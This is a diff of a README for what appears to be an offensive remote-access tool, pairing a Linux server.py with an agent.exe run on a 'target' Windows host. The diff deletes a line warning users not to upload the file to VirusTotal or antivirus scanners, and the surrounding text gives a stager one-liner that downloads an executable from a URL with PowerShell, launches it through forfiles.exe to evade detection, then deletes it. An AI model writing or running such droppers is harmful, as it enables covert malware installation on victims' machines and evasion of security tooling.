@@ -41,8 +41,6 @@ After running the script successfully, a file ```agent.exe``` will be created.  
 
 After starting server.py on a Linux host, execute ```agent.exe``` on your target Windows host.
 
-#### DO NOT, UNDER ANY CIRCUMSTANCES, UPLOAD THIS FILE TO VIRUSTOTAL, NODISTRIBUTE, OR ANY AV SCANNER.   
-
 Run the "stager" module to generate a one-liner and other droppers.
  ```
  powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
